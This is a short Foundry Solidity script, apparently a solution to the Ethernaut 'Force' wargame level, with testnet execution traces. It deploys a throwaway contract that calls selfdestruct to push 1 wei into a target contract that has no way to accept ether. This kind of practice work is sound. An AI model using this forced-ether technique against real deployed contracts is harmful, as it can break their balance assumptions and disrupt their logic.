// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed{
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {
  
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x18f80a0E19B15e669554B8175EbBb9aC726887db)); 
        vm.stopBroadcast();
    }
}

/*
Traces:
  [44498] ForceSolution::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [7970] → new <unknown>@0xCd7d09c7F4c1cf545f43dB7403213eA488423BB3
    │   └─ ← [Return] 0 bytes of code
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [7970] → new <unknown>@0xCd7d09c7F4c1cf545f43dB7403213eA488423BB3
    └─ ← [Return] 0 bytes of code


==========================

Chain 11155111

Estimated gas price: 0.00100002 gwei

Estimated total gas used for script: 83584

Estimated amount required: 0.00000008358567168 ETH

========================== */